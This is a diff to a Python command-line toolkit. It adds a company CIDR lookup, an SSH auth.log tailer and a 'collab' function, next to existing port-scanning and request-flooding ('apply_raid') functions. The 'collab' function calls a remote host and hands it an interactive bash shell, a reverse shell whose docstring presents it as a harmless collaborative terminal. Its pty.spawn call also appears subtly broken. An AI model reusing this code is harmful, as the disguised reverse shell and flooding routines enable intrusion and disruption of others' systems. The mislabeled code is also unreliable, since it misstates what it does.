@@ -1,36 +1,15 @@
-import os
-import time
-import gzip
 import socket
-import ipwhois
-import warnings
-import subprocess
-import urllib.parse
-from typing import List
-import hashlib
-
-
-import requests
-import paramiko
-import ipaddress
-import concurrent
-import pandas as pd
+import concurrent.futures
 from tqdm import tqdm
-from bs4 import BeautifulSoup
-from tabulate import tabulate
-from urllib.parse import urlparse
-from Wappalyzer import Wappalyzer, WebPage
-
-
-import html
-import json
-import black
-import magic
 import click
-import base64
-import platform
+import requests
+import urllib.parse
 import textwrap
-import binascii
+import random
+import ipwhois
+import paramiko
+import pty
+
 
 def scan_ports(url, common_ports=False):
     """
@@ -87,10 +66,7 @@ def scan_ports(url, common_ports=False):
     for port in open_ports:
         click.echo(port)
 
-import urllib.parse
-import requests
-import textwrap
-import click
+
 
 def capture_request(url):
     """
@@ -126,7 +102,7 @@ def capture_request(url):
     
     print(request_info)
 
-import requests
+
 
 def apply_disturb(url, method='GET', payload='', headers={}, cookies={}, count=1):
     """
@@ -253,3 +229,83 @@ def apply_raid(url, num_threats=6, num_requests=200, num_retries=4, pause_before
                     pbar.update(1)
             results.append(threat_results)
     return results
+
+
+
+
+def apply_cidr(company_name):
+    """
+    Look up the CIDR range for a company's domain name.
+    """
+    try:
+        # Look up the IP address for the company's domain name
+        ip_address = socket.gethostbyname(company_name)
+
+        # Look up the RDAP record for the IP address
+        rdap_record = ipwhois.IPWhois(ip_address).lookup_rdap()
+
+        # Extract the CIDR range from the RDAP record
+        cidr_range = rdap_record['network']['cidr']
+
+        return cidr_range
+
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+
+def ssh_logger(host, username, password):
+    """
+    Connects to a remote VPS server and tails the auth.log file.
+
+    Returns:
+    - Prints a continuous stream of output from the auth.log file to the console.
+
+    The program attempts to connect to the specified VPS server using SSH, with the provided
+    username and password. Once connected, it invokes a shell and sends the command to tail
+    the auth.log file using sudo. It then continuously checks for new output from the file and
+    prints it to the console as it is received.
+    """
+    # Create an SSH client object and set the missing host key policy to auto add
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    # Connect to the VPS server using the provided host, username, and password
+    ssh.connect(host, username=username, password=password)
+    
+    # Invoke a shell and send the command to tail the auth.log file using sudo
+    channel = ssh.invoke_shell()
+    channel.send('sudo tail -f /var/log/auth.log\n')
+    
+    # Continuously check for new output from the auth.log file and print it to the console
+    while True:
+        if channel.recv_ready():
+            output = channel.recv(1024).decode('utf-8')
+            click.echo(output, nl=False)
+
+
+def collab(host, port):
+    """
+    Connects to a remote machine and starts a collaborative terminal.
+
+    Args:
+    - host (str): The IP address or hostname of the remote machine.
+    - port (int): The port to connect to on the remote machine.
+
+    Returns:
+    - None. Starts a collaborative terminal session with the remote machine.
+
+    The program attempts to connect to the specified remote machine on the specified port.
+    If the connection is successful, it starts a new terminal session that is shared between
+    the local machine and the remote machine. All input and output is echoed to both machines.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, int(port)))
+        click.echo(f'Connected to {host}:{port}.')
+
+        pty.spawn(['/bin/bash'], stdin=sock, stdout=sock, stderr=sock)
+
+        click.echo('Terminal closed.')
+    except socket.error as e:
+        click.echo(f'Error connecting to {host}:{port}: {e}')
